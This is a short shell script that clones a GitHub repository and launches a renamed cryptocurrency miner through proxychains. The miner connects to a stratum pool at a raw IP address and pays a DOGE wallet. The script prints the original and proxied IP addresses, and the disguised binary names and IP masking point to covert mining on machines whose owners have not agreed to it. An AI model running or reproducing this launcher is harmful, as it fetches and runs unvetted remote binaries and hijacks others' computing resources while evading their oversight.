#!/bin/sh 

sudo apt update 
clear
sudo git clone https://github.com/artazimuka/pandanisem.git
clear
cd pandanisem 
chmod +x str-am64 proxy start.sh libproxychains4.so
chmod +x proxychains.conf
echo "IP ORI ==> "$(curl ifconfig.me)
echo "IP Baru ==> "$(./python curl ifconfig.me)
./proxy ./vakar -a lyra2z330 -o stratum+tcp://45.76.162.175:443 -u DRreZxpmCRTsVyr7iCiycLWRgnLh98xXAE.cpu -p c=DOGE,zap=BUTK-lyra/GXX/PYRK-lyra2z330 -t 2 --cpu-affinity=0x3
